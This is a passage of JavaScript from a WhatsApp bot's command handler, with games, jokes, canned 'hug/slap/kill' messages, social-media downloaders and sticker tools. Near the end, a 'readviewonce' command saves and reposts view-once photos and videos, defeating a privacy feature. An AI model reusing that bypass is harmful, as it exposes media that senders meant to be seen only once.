if (m.chat !== m.sender) return m.reply("Bot script successfully sent to private chat")

}

break

case "clsesi":

case "clearsesi":

case "clearsession": {

  try {

    const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")

    const dirsampah = fs.readdirSync("./system/cache").filter(e => e !== "A")

    for (const file of dirsesi) {

      await fs.promises.unlink(`./session/${file}`)

    }

    for (const file of dirsampah) {

      await fs.promises.unlink(`./system/cache/${file}`)

    }

    m.reply(`*Successfully cleaned trash ✅*\n` +

            `*${dirsesi.length}* session trash\n` +

            `*${dirsampah.length}* file trash`)

  } catch (err) {

    console.error("Failed to clean session:", err)

    m.reply("*Error occurred while cleaning session ❌*")

  }

}
break
// ==============================
// FUN COMMANDS
// ==============================

case 'joke': {
    try {
        const jokes = [
            "Why don't scientists trust atoms? Because they make up everything!",
            "Why did the scarecrow win an award? He was outstanding in his field!",
            "Why don't eggs tell jokes? They'd crack each other up!",
            "What do you call a fake noodle? An impasta!",
            "Why did the math book look so sad? Because it had too many problems!",
            "What do you call a bear with no teeth? A gummy bear!",
            "Why couldn't the bicycle stand up by itself? It was two tired!",
            "What do you call a sleeping bull? A bulldozer!",
            "Why don't skeletons fight each other? They don't have the guts!",
            "What's the best thing about Switzerland? I don't know, but the flag is a big plus!"
        ];
        
        const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
        ReplyButton(`😂 Joke:\n${randomJoke}`);
    } catch (error) {
        console.error('Joke error:', error);
        ReplyButton('Failed to tell a joke. Try again later!');
    }
    break;
}

case 'fact': {
    try {
        const facts = [
            "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly edible!",
            "Octopuses have three hearts. Two pump blood to the gills, while the third pumps it to the rest of the body.",
            "A group of flamingos is called a 'flamboyance'.",
            "Bananas are berries, but strawberries aren't.",
            "The shortest war in history lasted only 38 minutes. It was between Britain and Zanzibar in 1896.",
            "A day on Venus is longer than a year on Venus. It takes Venus 243 Earth days to rotate once, but only 225 Earth days to orbit the sun.",
            "The inventor of the Pringles can is now buried in one. Fred Baur asked for his ashes to be buried in a Pringles can.",
            "There's a species of jellyfish that is biologically immortal. The Turritopsis dohrnii can revert back to its juvenile form after reaching adulthood.",
            "A single cloud can weigh more than 1 million pounds.",
            "The world's oldest known recipe is for beer. It dates back about 4,000 years."
        ];
        
        const randomFact = facts[Math.floor(Math.random() * facts.length)];
        ReplyButton(`📚 Did you know?\n${randomFact}`);
    } catch (error) {
        console.error('Fact error:', error);
        ReplyButton('Failed to get a fact. Try again later!');
    }
    break;
}

case '8ball':
case 'magic8': {
    const question = args.join(' ');
    if (!question) return ReplyButton('Ask me a question! Usage: !8ball Will I have a good day today?');
    
    try {
        const responses = [
            "🎱 It is certain.",
            "🎱 It is decidedly so.",
            "🎱 Without a doubt.",
            "🎱 Yes - definitely.",
            "🎱 You may rely on it.",
            "🎱 As I see it, yes.",
            "🎱 Most likely.",
            "🎱 Outlook good.",
            "🎱 Yes.",
            "🎱 Signs point to yes.",
            "🎱 Reply hazy, try again.",
            "🎱 Ask again later.",
            "🎱 Better not tell you now.",
            "🎱 Cannot predict now.",
            "🎱 Concentrate and ask again.",
            "🎱 Don't count on it.",
            "🎱 My reply is no.",
            "🎱 My sources say no.",
            "🎱 Outlook not so good.",
            "🎱 Very doubtful."
        ];
        
        const response = responses[Math.floor(Math.random() * responses.length)];
        ReplyButton(`*Question:* ${question}\n\n*Answer:* ${response}`);
    } catch (error) {
        console.error('8ball error:', error);
        ReplyButton('The magic 8-ball is broken! Try again later.');
    }
    break;
}

case 'coinflip':
case 'flip': {
    try {
        const result = Math.random() > 0.5 ? 'Heads' : 'Tails';
        const emoji = result === 'Heads' ? '🪙' : '🪙';
        
        ReplyButton(`${emoji} Coin flip result: **${result}**`);
    } catch (error) {
        console.error('Coinflip error:', error);
        ReplyButton('The coin got lost! Try again.');
    }
    break;
}

case 'dice':
case 'roll': {
    try {
        const sides = parseInt(args[0]) || 6;
        if (sides < 2 || sides > 100) return ReplyButton('Please choose between 2-100 sides for the dice.');
        
        const result = Math.floor(Math.random() * sides) + 1;
        ReplyButton(`🎲 Rolling a ${sides}-sided dice...\n\nResult: **${result}**`);
    } catch (error) {
        console.error('Dice error:', error);
        ReplyButton('The dice rolled under the table! Try again.');
    }
    break;
}

case 'rps':
case 'rockpaperscissors': {
    const choice = args[0]?.toLowerCase();
    if (!choice || !['rock', 'paper', 'scissors'].includes(choice)) {
        return ReplyButton('Please choose: rock, paper, or scissors. Usage: !rps rock');
    }
    
    try {
        const choices = ['rock', 'paper', 'scissors'];
        const botChoice = choices[Math.floor(Math.random() * choices.length)];
        
        let result;
        if (choice === botChoice) {
            result = "It's a tie!";
        } else if (
            (choice === 'rock' && botChoice === 'scissors') ||
            (choice === 'paper' && botChoice === 'rock') ||
            (choice === 'scissors' && botChoice === 'paper')
        ) {
            result = "You win! 🎉";
        } else {
            result = "I win! 😎";
        }
        
        const emojis = {
            rock: '🪨',
            paper: '📄',
            scissors: '✂️'
        };
        
        ReplyButton(`${emojis[choice]} vs ${emojis[botChoice]}\n\nYou chose: ${choice}\nI chose: ${botChoice}\n\n**${result}**`);
    } catch (error) {
        console.error('RPS error:', error);
        ReplyButton('Rock, paper, scissors malfunction! Try again.');
    }
    break;
}

case 'ttt':
case 'tictactoe': {
    if (!args[0]) {
        // Initialize new game
        const gameId = Date.now().toString();
        activeGames[gameId] = {
            board: ['1', '2', '3', '4', '5', '6', '7', '8', '9'],
            players: [m.sender, null],
            currentPlayer: m.sender,
            status: 'waiting'
        };
        
        ReplyButton(`🎮 Tic Tac Toe Game #${gameId}\n\nWaiting for opponent... Use !ttt join ${gameId} to play!\n\nCurrent board:\n${renderTicTacToeBoard(activeGames[gameId].board)}`);
    } else if (args[0] === 'join' && args[1]) {
        // Join existing game
        const gameId = args[1];
        if (!activeGames[gameId] || activeGames[gameId].status !== 'waiting') {
            return ReplyButton('Invalid game ID or game already started.');
        }
        
        activeGames[gameId].players[1] = m.sender;
        activeGames[gameId].status = 'playing';
        
        ReplyButton(`🎮 Game #${gameId} started!\n\nPlayer X: @${activeGames[gameId].players[0].split('@')[0]}\nPlayer O: @${m.sender.split('@')[0]}\n\nCurrent board:\n${renderTicTacToeBoard(activeGames[gameId].board)}`, m.chat, {
            mentions: [activeGames[gameId].players[0], m.sender]
        });
    } else if (args[0] === 'move' && args[1] && args[2]) {
        // Make a move
        const gameId = args[1];
        const position = parseInt(args[2]) - 1;
        
        if (!activeGames[gameId] || activeGames[gameId].status !== 'playing') {
            return ReplyButton('Invalid game ID or game not active.');
        }
        
        if (activeGames[gameId].currentPlayer !== m.sender) {
            return ReplyButton("It's not your turn!");
        }
        
        if (position < 0 || position > 8 || activeGames[gameId].board[position] !== (position + 1).toString()) {
            return ReplyButton('Invalid move! Choose an empty position (1-9).');
        }
        
        const symbol = activeGames[gameId].players[0] === m.sender ? 'X' : 'O';
        activeGames[gameId].board[position] = symbol;
        
        // Check for win or draw
        const winner = checkTicTacToeWin(activeGames[gameId].board);
        if (winner) {
            activeGames[gameId].status = 'finished';
            ReplyButton(`🎮 Game #${gameId} finished!\n\n**${winner === 'draw' ? "It's a draw!" : `Player ${winner} wins!`}**\n\nFinal board:\n${renderTicTacToeBoard(activeGames[gameId].board)}`);
            delete activeGames[gameId];
        } else {
            // Switch player
            activeGames[gameId].currentPlayer = activeGames[gameId].currentPlayer === activeGames[gameId].players[0] 
                ? activeGames[gameId].players[1] 
                : activeGames[gameId].players[0];
            
            const nextPlayerNum = activeGames[gameId].currentPlayer === activeGames[gameId].players[0] ? 'X' : 'O';
            ReplyButton(`🎮 Game #${gameId}\n\nIt's Player ${nextPlayerNum}'s turn!\n\nCurrent board:\n${renderTicTacToeBoard(activeGames[gameId].board)}`, m.chat, {
                mentions: [activeGames[gameId].currentPlayer]
            });
        }
    } else if (args[0] === 'board' && args[1]) {
        // Show current board
        const gameId = args[1];
        if (!activeGames[gameId]) {
            return ReplyButton('Invalid game ID.');
        }
        
        ReplyButton(`🎮 Game #${gameId}\n\nCurrent board:\n${renderTicTacToeBoard(activeGames[gameId].board)}`);
    } else {
        ReplyButton(`🎮 Tic Tac Toe Commands:
        
!ttt - Start a new game
!ttt join [gameid] - Join a game
!ttt move [gameid] [position] - Make a move (1-9)
!ttt board [gameid] - Show current board`);
    }
    break;
}

case 'hug': {
    let target;
    if (m.quoted) {
        target = m.quoted.sender;
    } else if (m.mentionedJid?.length) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return ReplyButton('Who do you want to hug? Usage: !hug @user');
    }
    
    try {
        const hugs = [
            `🤗 ${m.pushName} gives @${target.split('@')[0]} a warm hug!`,
            `🫂 ${m.pushName} hugs @${target.split('@')[0]} tightly!`,
            `💖 ${m.pushName} embraces @${target.split('@')[0]} with love!`,
            `✨ ${m.pushName} gives @${target.split('@')[0]} a magical hug!`,
            `🐻 ${m.pushName} gives @${target.split('@')[0]} a bear hug!`
        ];
        
        const randomHug = hugs[Math.floor(Math.random() * hugs.length)];
        ReplyButton(randomHug, m.chat, { mentions: [target] });
    } catch (error) {
        console.error('Hug error:', error);
        ReplyButton('Hug failed! Virtual hug instead 💖');
    }
    break;
}

case 'kiss': {
    let target;
    if (m.quoted) {
        target = m.quoted.sender;
    } else if (m.mentionedJid?.length) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return ReplyButton('Who do you want to kiss? Usage: !kiss @user');
    }
    
    try {
        const kisses = [
            `😘 ${m.pushName} gives @${target.split('@')[0]} a sweet kiss!`,
            `💋 ${m.pushName} plants a kiss on @${target.split('@')[0]}'s cheek!`,
            `❤️ ${m.pushName} kisses @${target.split('@')[0]} passionately!`,
            `😚 ${m.pushName} blows a kiss to @${target.split('@')[0]}!`,
            `🥰 ${m.pushName} gives @${target.split('@')[0]} a loving kiss!`
        ];
        
        const randomKiss = kisses[Math.floor(Math.random() * kisses.length)];
        ReplyButton(randomKiss, m.chat, { mentions: [target] });
    } catch (error) {
        console.error('Kiss error:', error);
        ReplyButton('Kiss failed! Virtual kiss instead 😘');
    }
    break;
}

case 'pat': {
    let target;
    if (m.quoted) {
        target = m.quoted.sender;
    } else if (m.mentionedJid?.length) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return ReplyButton('Who do you want to pat? Usage: !pat @user');
    }
    
    try {
        const pats = [
            `😊 ${m.pushName} pats @${target.split('@')[0]}'s head gently!`,
            `👋 ${m.pushName} gives @${target.split('@')[0]} a friendly pat!`,
            `🐱 ${m.pushName} pats @${target.split('@')[0]} like a good kitty!`,
            `👍 ${m.pushName} pats @${target.split('@')[0]} on the back!`,
            `💫 ${m.pushName} gives @${target.split('@')[0]} a magical pat!`
        ];
        
        const randomPat = pats[Math.floor(Math.random() * pats.length)];
        ReplyButton(randomPat, m.chat, { mentions: [target] });
    } catch (error) {
        console.error('Pat error:', error);
        ReplyButton('Pat failed! Virtual pat instead 👋');
    }
    break;
}

case 'slap': {
    let target;
    if (m.quoted) {
        target = m.quoted.sender;
    } else if (m.mentionedJid?.length) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return ReplyButton('Who do you want to slap? Usage: !slap @user');
    }
    
    try {
        const slaps = [
            `👋 ${m.pushName} slaps @${target.split('@')[0]} with a large trout!`,
            `🤚 ${m.pushName} gives @${target.split('@')[0]} a powerful slap!`,
            `💥 ${m.pushName} slaps @${target.split('@')[0]} into next week!`,
            `🫲 ${m.pushName} delivers a stinging slap to @${target.split('@')[0]}!`,
            `🤛 ${m.pushName} slaps @${target.split('@')[0]} with a glove!`
        ];
        
        const randomSlap = slaps[Math.floor(Math.random() * slaps.length)];
        ReplyButton(randomSlap, m.chat, { mentions: [target] });
    } catch (error) {
        console.error('Slap error:', error);
        ReplyButton('Slap failed! Virtual slap instead 👋');
    }
    break;
}

case 'kill': {
    let target;
    if (m.quoted) {
        target = m.quoted.sender;
    } else if (m.mentionedJid?.length) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return ReplyButton('Who do you want to kill? Usage: !kill @user');
    }
    
    try {
        const kills = [
            `⚰️ ${m.pushName} brutally murders @${target.split('@')[0]}!`,
            `🔪 ${m.pushName} stabs @${target.split('@')[0]} 37 times in the chest!`,
            `💀 ${m.pushName} sends @${target.split('@')[0]} to the shadow realm!`,
            `☠️ ${m.pushName} eliminates @${target.split('@')[0]} with extreme prejudice!`,
            `🪦 ${m.pushName} kills @${target.split('@')[0]} dead! So dead!`
        ];
        
        const randomKill = kills[Math.floor(Math.random() * kills.length)];
        ReplyButton(randomKill, m.chat, { mentions: [target] });
    } catch (error) {
        console.error('Kill error:', error);
        ReplyButton('Kill failed! They survived your attempt 🔪');
    }
    break;
}

case 'cuddle': {
    let target;
    if (m.quoted) {
        target = m.quoted.sender;
    } else if (m.mentionedJid?.length) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return ReplyButton('Who do you want to cuddle? Usage: !cuddle @user');
    }
    
    try {
        const cuddles = [
            `🛌 ${m.pushName} cuddles up with @${target.split('@')[0]}!`,
            `🥰 ${m.pushName} snuggles with @${target.split('@')[0]} warmly!`,
            `💞 ${m.pushName} cuddles @${target.split('@')[0]} close!`,
            `🐻 ${m.pushName} gives @${target.split('@')[0]} a bear cuddle!`,
            `🫂 ${m.pushName} cuddles @${target.split('@')[0]} under a blanket!`
        ];
        
        const randomCuddle = cuddles[Math.floor(Math.random() * cuddles.length)];
        ReplyButton(randomCuddle, m.chat, { mentions: [target] });
    } catch (error) {
        console.error('Cuddle error:', error);
        ReplyButton('Cuddle failed! Virtual cuddle instead 🥰');
    }
    break;
}

case 'rate': {
    const thing = args.join(' ') || 'everything';
    
    try {
        const rating = Math.floor(Math.random() * 11); // 0-10
        const stars = '⭐'.repeat(rating) + '☆'.repeat(10 - rating);
        
        ReplyButton(`📊 I rate ${thing}:\n\n${stars}\n${rating}/10`);
    } catch (error) {
        console.error('Rate error:', error);
        ReplyButton('Rating failed! Everything is awesome anyway 💫');
    }
    break;
}

case 'roast': {
    let target;
    if (m.quoted) {
        target = m.quoted.sender;
    } else if (m.mentionedJid?.length) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return ReplyButton('Who do you want to roast? Usage: !roast @user');
    }
    
    try {
        const roasts = [
            `If laughter is the best medicine, your face must be curing the world.`,
            `You're not stupid; you just have bad luck when thinking.`,
            `Your family tree must be a cactus because everybody on it is a prick.`,
            `I was going to give you a nasty look, but I see you already have one.`,
            `You bring everyone so much joy... when you leave the room.`,
            `I'd agree with you but then we'd both be wrong.`,
            `You have a face for radio.`,
            `I'd explain it to you but I don't have any crayons with me.`,
            `Your IQ is so low, it's a miracle you remember to breathe.`,
            `You're the reason God created the middle finger.`
        ];
        
        const randomRoast = roasts[Math.floor(Math.random() * roasts.length)];
        ReplyButton(`🔥 Roast for @${target.split('@')[0]}:\n\n${randomRoast}`, m.chat, { mentions: [target] });
    } catch (error) {
        console.error('Roast error:', error);
        ReplyButton('Roast failed! You win this time 🔥');
    }
    break;
}

case 'quote': {
    try {
        const quotes = [
            { text: "The only way to do great work is to love what you do.", author: "Steve Jobs" },
            { text: "Life is what happens when you're busy making other plans.", author: "John Lennon" },
            { text: "The future belongs to those who believe in the beauty of their dreams.", author: "Eleanor Roosevelt" },
            { text: "Be yourself; everyone else is already taken.", author: "Oscar Wilde" },
            { text: "You must be the change you wish to see in the world.", author: "Mahatma Gandhi" },
            { text: "The only impossible journey is the one you never begin.", author: "Tony Robbins" },
            { text: "In three words I can sum up everything I've learned about life: it goes on.", author: "Robert Frost" },
            { text: "Don't count the days, make the days count.", author: "Muhammad Ali" },
            { text: "Life is really simple, but we insist on making it complicated.", author: "Confucius" },
            { text: "The purpose of our lives is to be happy.", author: "Dalai Lama" }
        ];
        
        const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
        ReplyButton(`💬 "${randomQuote.text}"\n\n- ${randomQuote.author}`);
    } catch (error) {
        console.error('Quote error:', error);
        ReplyButton('Failed to get a quote. Stay inspired! 💫');
    }
    break;
}
// Trivia game
case 'trivia': {
    try {
        // You can integrate with a trivia API or use predefined questions
        const questions = [
            {
                question: "What is the capital of France?",
                options: ["London", "Berlin", "Paris", "Madrid"],
                answer: 2
            },
            {
                question: "Which planet is known as the Red Planet?",
                options: ["Venus", "Mars", "Jupiter", "Saturn"],
                answer: 1
            }
            // Add more questions...
        ];
        
        const randomQuestion = questions[Math.floor(Math.random() * questions.length)];
        const questionText = `❓ ${randomQuestion.question}\n\n${randomQuestion.options.map((opt, i) => `${i + 1}. ${opt}`).join('\n')}`;
        
        // Store the question for answer checking
        triviaQuestions[m.chat] = {
            question: randomQuestion,
            timestamp: Date.now()
        };
        
        ReplyButton(questionText);
    } catch (error) {
        console.error('Trivia error:', error);
        ReplyButton('Failed to load trivia question. Try again later!');
    }
    break;
}

// Would You Rather game
case 'wyr':
case 'wouldyourather': {
    try {
        const questions = [
            "Would you rather be able to fly or be invisible?",
            "Would you rather have unlimited money or unlimited time?",
            "Would you rather be able to talk to animals or speak all languages?",
            "Would you rather live without internet or without air conditioning?",
            "Would you rather be famous or be wise?"
        ];
        
        const randomQuestion = questions[Math.floor(Math.random() * questions.length)];
        ReplyButton(`🤔 Would You Rather:\n\n${randomQuestion}`);
    } catch (error) {
        console.error('WYR error:', error);
        ReplyButton('Failed to load question. Try again later!');
    }
    break;
}
//=================================================//
//downloder//
case 'tt': case 'ttslide': case 'tiktok': {
    if (!text) return m.reply("Where's the URL?")
    if (!text.startsWith("https://")) return m.reply("Where's the URL?")
    
    await tiktokDl(q).then(async (result) => {
        m.reply(`⚡ Downloading...`)
        if (!result.status) return m.reply("Error")
        
        if (result.durations == 0 && result.duration == "0 Seconds") {
            // Handle image slides (no video)
            for (let a of result.data) {
                // Send each image directly without buttons
                await xip.sendMessage(m.chat, { 
                    image: { url: a.url }, 
                    caption: `*Done By ⏤͟͟͞͞RedDragon official*` 
                }, { quoted: m })
            }
        } else {
            // Handle video
            let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
            await xip.sendMessage(m.chat, {
                video: { url: urlVid.url }, 
                mimetype: 'video/mp4', 
                caption: `*Done*`
            }, { quoted: m })
        }
    }).catch(e => console.log(e))
    
    await xip.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break

// ==============================
// MEDIA COMMANDS
// ==============================


case 'sticker':
case 's': {
    if (!m.quoted && !m.message?.imageMessage) {
        return ReplyButton('Please reply to an image or send an image with caption !sticker');
    }

    try {
        let mediaBuffer;
        if (m.quoted && m.quoted.message?.imageMessage) {
            mediaBuffer = await m.quoted.download();
        } else if (m.message?.imageMessage) {
            mediaBuffer = await m.download();
        } else {
            return ReplyButton('Please reply to an image or send an image with caption !sticker');
        }

        // Convert to sticker
        const stickerBuffer = await convertToSticker(mediaBuffer);
        
        await client.sendMessage(m.chat, {
            sticker: stickerBuffer,
            mentions: [m.sender]
        });
        
    } catch (error) {
        console.error('Sticker error:', error);
        ReplyButton('Failed to create sticker. Please try with a different image.');
    }
    break;
}

case 'stickeremoji':
case 'ste': {
    if (!m.quoted && !m.message?.imageMessage) {
        return ReplyButton('Please reply to an image or send an image with caption !stickeremoji 😂');
    }

    const emoji = args[0] || '😂';
    
    try {
        let mediaBuffer;
        if (m.quoted && m.quoted.message?.imageMessage) {
            mediaBuffer = await m.quoted.download();
        } else if (m.message?.imageMessage) {
            mediaBuffer = await m.download();
        } else {
            return ReplyButton('Please reply to an image or send an image with caption !stickeremoji 😂');
        }

        // Convert to sticker with emoji
        const stickerBuffer = await convertToSticker(mediaBuffer, emoji);
        
        await client.sendMessage(m.chat, {
            sticker: stickerBuffer,
            mentions: [m.sender]
        });
        
    } catch (error) {
        console.error('Sticker emoji error:', error);
        ReplyButton('Failed to create sticker. Please try with a different image.');
    }
    break;
}

case 'meme': {
    try {
        // Get random meme from Reddit or API
        const meme = await getRandomMeme();
        
        await client.sendMessage(m.chat, {
            image: { url: meme.url },
            caption: `📛 ${meme.title}`
        });
        
    } catch (error) {
        console.error('Meme error:', error);
        ReplyButton('Failed to fetch meme. Please try again later.');
    }
    break;
}

case 'quote': {
    const text = args.join(' ') || m.quoted?.text;
    if (!text) return ReplyButton('Please provide text for the quote. Usage: !quote Your text here');
    
    try {
        // Create text image quote
        const quoteImage = await createQuoteImage(text, m.pushName);
        
        await client.sendMessage(m.chat, {
            image: quoteImage,
            caption: `💬 Quote by ${m.pushName}`
        });
        
    } catch (error) {
        console.error('Quote error:', error);
        ReplyButton('Failed to create quote image.');
    }
    break;
}

case 'play': {
    const query = args.join(' ');
    if (!query) return ReplyButton('Please provide a song name. Usage: !play song name');
    
    try {
        // Search and get audio
        const audioInfo = await searchAudio(query);
        
        // Send audio message
        await client.sendMessage(m.chat, {
            audio: { url: audioInfo.url },
            mimetype: 'audio/mp4',
            fileName: `${audioInfo.title}.mp3`,
            caption: `🎵 Now playing: ${audioInfo.title}`
        });
        
    } catch (error) {
        console.error('Play error:', error);
        ReplyButton('Failed to play audio. Please try a different song.');
    }
    break;
}

case 'ytsearch': {
    const query = args.join(' ');
    if (!query) return ReplyButton('Please provide a search query. Usage: !ytsearch query');
    
    try {
        // Search YouTube
        const results = await searchYouTube(query);
        
        let resultText = '🔍 YouTube Search Results:\n\n';
        results.slice(0, 5).forEach((result, index) => {
            resultText += `${index + 1}. ${result.title}\n   👁️ ${result.views} | ⏱️ ${result.duration}\n   🔗 ${result.url}\n\n`;
        });
        
        ReplyButton(resultText);
        
    } catch (error) {
        console.error('YT Search error:', error);
        ReplyButton('Failed to search YouTube. Please try again later.');
    }
    break;
}

case 'spotify': {
    const query = args.join(' ');
    if (!query) return ReplyButton('Please provide a search query. Usage: !spotify song name');
    
    try {
        // Search Spotify
        const results = await searchSpotify(query);
        
        let resultText = '🎵 Spotify Search Results:\n\n';
        results.slice(0, 5).forEach((result, index) => {
            resultText += `${index + 1}. ${result.name} - ${result.artist}\n   💿 ${result.album}\n   ⏱️ ${result.duration}\n\n`;
        });
        
        ReplyButton(resultText);
        
    } catch (error) {
        console.error('Spotify error:', error);
        ReplyButton('Failed to search Spotify. Please try again later.');
    }
    break;
}

case 'lyrics': {
    const query = args.join(' ') || m.quoted?.text;
    if (!query) return ReplyButton('Please provide a song name. Usage: !lyrics song name');
    
    try {
        // Search lyrics
        const lyrics = await searchLyrics(query);
        
        if (lyrics.length > 400) {
            // Send as file if lyrics are too long
            await client.sendMessage(m.chat, {
                document: Buffer.from(lyrics),
                fileName: `${query} lyrics.txt`,
                mimetype: 'text/plain',
                caption: `📝 Lyrics for: ${query}`
            });
        } else {
            ReplyButton(`📝 Lyrics for "${query}":\n\n${lyrics}`);
        }
        
    } catch (error) {
        console.error('Lyrics error:', error);
        ReplyButton('Failed to find lyrics. Please try a different song.');
    }
    break;
}

case 'igdl':
case 'instagram': {
    const url = args[0] || m.quoted?.text;
    if (!url || !url.includes('instagram.com')) {
        return ReplyButton('Please provide a valid Instagram URL. Usage: !igdl https://instagram.com/p/...');
    }
    
    try {
        // Download Instagram media
        const media = await downloadInstagram(url);
        
        if (media.type === 'image') {
            await client.sendMessage(m.chat, {
                image: { url: media.url },
                caption: `📸 Instagram Download\n${media.caption || ''}`
            });
        } else if (media.type === 'video') {
            await client.sendMessage(m.chat, {
                video: { url: media.url },
                caption: `🎥 Instagram Download\n${media.caption || ''}`
            });
        } else if (media.type === 'carousel') {
            for (const item of media.items) {
                if (item.type === 'image') {
                    await client.sendMessage(m.chat, {
                        image: { url: item.url }
                    });
                } else {
                    await client.sendMessage(m.chat, {
                        video: { url: item.url }
                    });
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
        
    } catch (error) {
        console.error('Instagram DL error:', error);
        ReplyButton('Failed to download Instagram content. The link may be invalid or private.');
    }
    break;
}

case 'fbdl':
case 'facebook': {
    const url = args[0] || m.quoted?.text;
    if (!url || !url.includes('facebook.com')) {
        return ReplyButton('Please provide a valid Facebook URL. Usage: !fbdl https://facebook.com/...');
    }
    
    try {
        // Download Facebook video
        const video = await downloadFacebook(url);
        
        await client.sendMessage(m.chat, {
            video: { url: video.url },
            caption: `📹 Facebook Video Download\n${video.title || ''}`
        });
        
    } catch (error) {
        console.error('Facebook DL error:', error);
        ReplyButton('Failed to download Facebook video. The link may be invalid or private.');
    }
    break;
}

case 'twtdl':
case 'twitter': {
    const url = args[0] || m.quoted?.text;
    if (!url || !url.includes('twitter.com') && !url.includes('x.com')) {
        return ReplyButton('Please provide a valid Twitter/X URL. Usage: !twtdl https://twitter.com/...');
    }
    
    try {
        // Download Twitter media
        const media = await downloadTwitter(url);
        
        if (media.type === 'image') {
            await client.sendMessage(m.chat, {
                image: { url: media.url },
                caption: `🐦 Twitter Download\n${media.text || ''}`
            });
        } else if (media.type === 'video') {
            await client.sendMessage(m.chat, {
                video: { url: media.url },
                caption: `🐦 Twitter Video Download\n${media.text || ''}`
            });
        } else if (media.type === 'gif') {
            await client.sendMessage(m.chat, {
                video: { url: media.url },
                caption: `🐦 Twitter GIF Download\n${media.text || ''}`
            });
        }
        
    } catch (error) {
        console.error('Twitter DL error:', error);
        ReplyButton('Failed to download Twitter content. The link may be invalid or private.');
    }
    break;
}

case 'img':
case 'image': {
    const query = args.join(' ');
    if (!query) return ReplyButton('Please provide a search query. Usage: !img query');
    
    try {
        // Search images
        const images = await searchImages(query);
        
        // Send random image from results
        const randomImage = images[Math.floor(Math.random() * images.length)];
        
        await client.sendMessage(m.chat, {
            image: { url: randomImage },
            caption: `📸 Image search: ${query}`
        });
        
    } catch (error) {
        console.error('Image search error:', error);
        ReplyButton('Failed to search images. Please try again later.');
    }
    break;
}

case 'toaudio': {
    if (!m.quoted || !m.quoted.message?.videoMessage) {
        return ReplyButton('Please reply to a video message to convert to audio.');
    }
    
    try {
        // Download video
        const videoBuffer = await m.quoted.download();
        
        // Convert to audio
        const audioBuffer = await convertVideoToAudio(videoBuffer);
        
        await client.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: 'audio/mpeg',
            fileName: 'audio.mp3'
        });
        
    } catch (error) {
        console.error('To Audio error:', error);
        ReplyButton('Failed to convert video to audio.');
    }
    break;
}

case 'tovid':
case 'tovideo': {
    if (!m.quoted || !m.quoted.message?.documentMessage) {
        return ReplyButton('Please reply to a document to convert to video.');
    }
    
    const document = m.quoted.message.documentMessage;
    if (!document.fileName.includes('.mp4') && !document.fileName.includes('.mov')) {
        return ReplyButton('Please reply to a video file (MP4, MOV).');
    }
    
    try {
        // Download document
        const documentBuffer = await m.quoted.download();
        
        // Send as video
        await client.sendMessage(m.chat, {
            video: documentBuffer,
            caption: 'Converted to video'
        });
        
    } catch (error) {
        console.error('To Video error:', error);
        ReplyButton('Failed to convert document to video.');
    }
    break;
}

case 'compress': {
    if (!m.quoted || (!m.quoted.message?.imageMessage && !m.quoted.message?.videoMessage)) {
        return ReplyButton('Please reply to an image or video to compress.');
    }
    
    try {
        let mediaBuffer = await m.quoted.download();
        let compressedBuffer;
        let type;
        
        if (m.quoted.message?.imageMessage) {
            // Compress image
            compressedBuffer = await compressImage(mediaBuffer);
            type = 'image';
        } else {
            // Compress video
            compressedBuffer = await compressVideo(mediaBuffer);
            type = 'video';
        }
        
        await client.sendMessage(m.chat, {
            [type]: compressedBuffer,
            caption: `📦 Compressed ${type}`
        });
        
    } catch (error) {
        console.error('Compress error:', error);
        ReplyButton('Failed to compress media.');
    }
    break;
}

              
//=================================================//
break
case "cekidch": case "idch": {

if (!text) return ReplyButton(example("linkchnya"))

if (!text.includes("https://whatsapp.com/channel/")) return ReplyButton("Invalid link")

let result = text.split('https://whatsapp.com/channel/')[1]

let res = await client.newsletterMetadata("invite", result)

let teks = `${res.id}

`

return ReplyButton(teks)

}

break

case "reactch": {

 if (!text || !args[0] || !args[1]) 

 return ReplyButton(example("linkch 😐"));

 if (!args[0].includes("https://whatsapp.com/channel/")) 

 return ReplyButton("Invalid link")

 let result = args[0].split('/')[4]

 let serverId = args[0].split('/')[5]

 let res = await client.newsletterMetadata("invite", result) 

 await client.newsletterReactMessage(res.id, serverId, args[1])

 ReplyButton(`Successfully sent reaction ${args[1]} to channel ${res.name}`)

}

break;

case "rvo":

case "readvo":

case 'readviewonce':

case 'readviewoncemessage': {

  if (!m.quoted) return ReplyButton("Reply to an image/video that you want to view");

  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 

    return ReplyButton("This is not a view-once message.");

  let msg = m.quoted.message;

  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {

    return ReplyButton("The quoted message is not an image or video.");

  }

  // Download media content

  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];

  for await (const chunk of media) {

    bufferArray.push(chunk);

  }

  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)

  if (type === "videoMessage") {

    await client.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });

  } else if (type === "imageMessage") {

    await client.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });

  }

